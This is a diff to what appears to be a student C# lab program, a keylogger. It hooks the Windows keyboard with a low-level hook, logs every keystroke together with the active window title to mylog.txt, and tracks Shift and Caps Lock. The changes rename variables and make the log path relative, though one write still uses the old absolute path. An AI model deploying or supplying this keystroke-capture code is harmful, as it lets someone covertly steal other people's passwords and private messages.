@@ -17,13 +17,13 @@ namespace lab4
         private static IntPtr hook = IntPtr.Zero;
         private static LowLevelKeyboardProc llkProcedure = HookCallback;
         public static string windowsTitle = GetActiveWindowTitle();
-        public static bool checkWrite = false;
-        public static bool shift = false;
-        public static bool caps = false;
+        public static bool isWindowsTitleWrite = false;
+        public static bool isShiftPressed = false;
+        public static bool isCapsPessed = false;
 
         static void Main(string[] args)
         {
-            File.Delete(@"D:\2sem\C#\Lab4\lab4.1\mylog.txt");
+            File.Delete(@"mylog.txt");
             hook = SetHook(llkProcedure);
             Application.Run();
             UnhookWindowsHookEx(hook);
@@ -41,18 +41,18 @@ namespace lab4
                 if (windowsTitle != GetActiveWindowTitle())
                 {
                     windowsTitle = GetActiveWindowTitle();
-                    checkWrite = false;
+                    isWindowsTitleWrite = false;
                 }                
 
                 if (((Keys)vkCode) == Keys.Shift || ((Keys)vkCode) == Keys.LShiftKey || ((Keys)vkCode) == Keys.RShiftKey)
                 {
-                    if (shift == false)
+                    if (isShiftPressed == false)
                     {
-                        shift = true;
+                        isShiftPressed = true;
                     }
                     else
                     {
-                        shift = false;
+                        isShiftPressed = false;
                     }
                     isShift = true;
                 }
@@ -60,24 +60,24 @@ namespace lab4
                 {
                     isShift = false;
                 }
-                if(shift == true && (Keys)vkCode == Keys.CapsLock)
+                if(isShiftPressed == true && (Keys)vkCode == Keys.CapsLock)
                 {
-                    shift = false;
+                    isShiftPressed = false;
                 }
                 if((Keys)vkCode == Keys.CapsLock)
                 {
-                    if (caps == false)
+                    if (isCapsPessed == false)
                     {
-                        caps = true;
+                        isCapsPessed = true;
                     }
                     else
                     {
-                        caps = false;
+                        isCapsPessed = false;
                     }
                 }
 
-                bool isBig = shift | caps;
-                if(shift == true && caps == true)
+                bool isBig = isShiftPressed | isCapsPessed;
+                if(isShiftPressed == true && isCapsPessed == true)
                 {
                     isBig = false;
                 }
@@ -86,7 +86,7 @@ namespace lab4
                 {
                     ShowWindowsTitle();
                     Console.Out.Write(".");
-                    StreamWriter output = new StreamWriter(@"D:\2sem\C#\Lab4\lab4.1\mylog.txt", true);
+                    StreamWriter output = new StreamWriter(@"mylog.txt", true);
                     output.Write(".");
                     output.Close();
                 }
@@ -94,7 +94,7 @@ namespace lab4
                 {
                     ShowWindowsTitle();
                     Console.Out.Write(",");
-                    StreamWriter output = new StreamWriter(@"D:\2sem\C#\Lab4\lab4.1\mylog.txt", true);
+                    StreamWriter output = new StreamWriter(@"mylog.txt", true);
                     output.Write(",");
                     output.Close();
                 }
@@ -102,7 +102,7 @@ namespace lab4
                 {
                     ShowWindowsTitle();
                     Console.Out.Write(" ");
-                    StreamWriter output = new StreamWriter(@"D:\2sem\C#\Lab4\lab4.1\mylog.txt", true);
+                    StreamWriter output = new StreamWriter(@"mylog.txt", true);
                     output.Write(" ");
                     output.Close();
                 }
@@ -117,7 +117,7 @@ namespace lab4
                             outputString = ((Keys)vkCode).ToString().ToLower();
                         }
                         Console.Out.Write(outputString);
-                        StreamWriter output = new StreamWriter(@"D:\2sem\C#\Lab4\lab4.1\mylog.txt", true);
+                        StreamWriter output = new StreamWriter(@"mylog.txt", true);
                         output.Write(outputString);
                         output.Close();
                     }
@@ -167,10 +167,10 @@ namespace lab4
 
         public static void ShowWindowsTitle()
         {
-            if (checkWrite == false)
+            if (isWindowsTitleWrite == false)
             {
                 Console.Out.Write($"[{windowsTitle}]");
-                checkWrite = true;
+                isWindowsTitleWrite = true;
                 StreamWriter output = new StreamWriter(@"D:\2sem\C#\Lab4\lab4.1\mylog.txt", true);
                 output.Write($"[{windowsTitle}]");
                 output.Close();
